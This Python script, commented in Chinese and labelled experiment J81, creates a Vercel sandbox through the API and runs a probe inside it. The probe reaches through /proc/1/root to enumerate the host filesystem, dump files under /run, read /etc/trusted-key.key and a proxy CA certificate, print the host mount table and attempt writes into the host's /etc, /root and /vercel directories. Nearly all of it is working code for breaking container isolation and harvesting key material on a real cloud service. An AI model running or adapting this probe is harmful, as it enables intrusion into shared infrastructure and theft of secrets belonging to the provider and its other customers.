# 实验J81: /proc/1/root 深入 — /vercel /local /tmp 枚举 + mountinfo + 写权限测试
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj81"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re

R = "/proc/1/root"

def walk(root, maxdepth=6):
    found = []
    def rec(d, depth):
        if depth > maxdepth:
            return
        try:
            entries = sorted(os.listdir(d))
        except Exception:
            return
        for e in entries:
            p = os.path.join(d, e)
            try:
                if os.path.isdir(p) and not os.path.islink(p):
                    rec(p, depth + 1)
                else:
                    st = os.lstat(p)
                    found.append((p, st.st_size))
            except Exception:
                pass
    rec(root, 0)
    return found

print("== [1] /vercel /local /tmp /run 全枚举 ==", flush=True)
for d in ["/vercel", "/local", "/tmp", "/run", "/root", "/home"]:
    root = R + d
    print("--- %s ---" % d, flush=True)
    try:
        files = walk(root, 6)
    except Exception as e:
        print("  walk EXC:", e, flush=True)
        continue
    for p, size in sorted(files, key=lambda x: -x[1])[:80]:
        print("  %10d  %s" % (size, p[len(R):]), flush=True)
    print("  (%d files total)" % len(files), flush=True)

print("== [2] /run 全部文件内容 ==", flush=True)
for p, size in walk(R + "/run", 2):
    try:
        d = open(p, "rb").read(400)
        print("  %s (%d): %r" % (p[len(R):], len(d), d[:400]), flush=True)
    except Exception as e:
        print("  %s read EXC: %s" % (p[len(R):], e), flush=True)

print("== [3] vercel-proxy-ca.pem / trusted-key.key 内容 ==", flush=True)
for f in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem", "/etc/trusted-key.key"]:
    try:
        d = open(R + f, "rb").read(800)
        print("  %s: %r" % (f, d[:800]), flush=True)
    except Exception as e:
        print("  %s EXC: %s" % (f, e), flush=True)

print("== [4] /proc/1/mountinfo (宿主挂载视图) ==", flush=True)
try:
    mi = open("/proc/1/mountinfo", "r").read()
    for line in mi.splitlines():
        if any(k in line for k in [" / ", "/vercel", "/run", "/volumes", "overlay", "vda", "vdb", "rootfs"]):
            print("  " + line[:220], flush=True)
except Exception as e:
    print("  mountinfo EXC:", e, flush=True)

print("== [5] 写权限测试 (宿主rootfs) ==", flush=True)
import subprocess
for target in ["/proc/1/root/tmp/px_write_test.txt", "/proc/1/root/vercel/px_write_test.txt",
               "/proc/1/root/etc/px_write_test.txt", "/proc/1/root/root/px_write_test.txt"]:
    try:
        with open(target, "w") as f:
            f.write("hello from sandbox " + os.path.basename(target))
        ok = os.path.exists(target)
        print("  WRITE OK: %s exists=%s" % (target, ok), flush=True)
        if ok:
            print("  content: %r" % open(target).read(), flush=True)
    except Exception as e:
        print("  WRITE FAIL: %s -> %s: %s" % (target, type(e).__name__, e), flush=True)
"""
run_cmd(sid, PROBE, "procroot-deep", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
